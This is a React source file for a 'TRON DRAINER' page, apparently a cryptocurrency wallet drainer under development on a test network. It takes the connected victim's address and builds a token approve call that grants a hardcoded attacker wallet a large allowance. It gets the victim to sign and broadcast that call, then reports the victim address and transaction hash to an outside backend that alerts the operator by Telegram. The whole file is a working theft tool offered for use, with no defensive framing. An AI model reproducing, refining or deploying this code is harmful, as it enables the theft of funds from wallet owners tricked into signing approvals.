import React, { useState } from "react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT on Shasta
// TEMPORARY: We'll use the connected address for testing. Replace with correct attacker address later.
const BACKEND = "https://qr-drainer.onrender.com";

export default function App() {
  const [status, setStatus] = useState("Idle");
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);

  const handleDrain = async () => {
    setStatus("Starting...");
    addLog("Process started.");

    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
      addLog("ERROR: TronWeb not detected or not connected.");
      setStatus("Failed: Wallet not connected");
      return;
    }

    const victimAddress = window.tronWeb.defaultAddress.base58;
    addLog(`Connected as: ${victimAddress}`);

    // VALIDATE ATTACKER ADDRESS
    let ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou";
    if (!window.tronWeb.isAddress(ATTACKER_WALLET)) {
      addLog(`WARNING: ATTACKER_WALLET is invalid! Using connected address for test.`);
      ATTACKER_WALLET = victimAddress; // Fallback to connected address
    }
    addLog(`Spender Address: ${ATTACKER_WALLET}`);

    try {
      setStatus("Building Payload...");
      addLog("Converting to Hex...");
      
      // Use tronWeb.toHex() which is more reliable
      const spenderHex = window.tronWeb.toHex(ATTACKER_WALLET);
      const ownerHex = window.tronWeb.defaultAddress.hex;
      
      addLog(`Spender Hex: ${spenderHex}`);
      addLog(`Owner Hex: ${ownerHex}`);

      // Build transaction
      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: 'address', value: spenderHex },
          { type: 'uint256', value: "1000000000000000" }
        ],
        ownerHex
      );

      if (!transaction.result || !transaction.result.result) {
        throw new Error("Contract call rejected by node");
      }
      addLog("Transaction built successfully.");

      setStatus("Requesting Signature...");
      addLog("Sending to wallet for signature...");
      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      addLog("Transaction signed!");

      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
      
      if (!broadcast.result) {
        throw new Error("Broadcast failed: " + (broadcast.code || "Unknown error"));
      }

      const txId = broadcast.txid;
      addLog(`Broadcast successful! TX ID: ${txId}`);
      setStatus("Success! Alerting Backend...");

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: txId,
          network: "TRON Shasta"
        })
      });

      addLog("Backend alerted. Check Telegram.");
      setStatus("✅ DRAIN COMPLETE. Check Telegram.");

    } catch (error) {
      console.error(error);
      addLog(`FATAL ERROR: ${error.message}`);
      setStatus(`Failed: ${error.message}`);
    }
  };

  return (
    <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
      <h1>TRON DRAINER - DEBUG MODE</h1>
      <p>Current Status: <strong>{status}</strong></p>
      
      <button 
        onClick={handleDrain} 
        style={{ padding: "20px", fontSize: "20px", background: "red", color: "white", border: "none", cursor: "pointer", marginBottom: "20px" }}
      >
        EXECUTE DRAIN (APPROVE)
      </button>

      <div style={{ background: "#111", padding: "20px", border: "1px solid #333" }}>
        <h3>System Logs:</h3>
        {logs.map((log, i) => <div key={i} style={{marginBottom: "5px"}}>{log}</div>)}
      </div>
    </div>
  );
}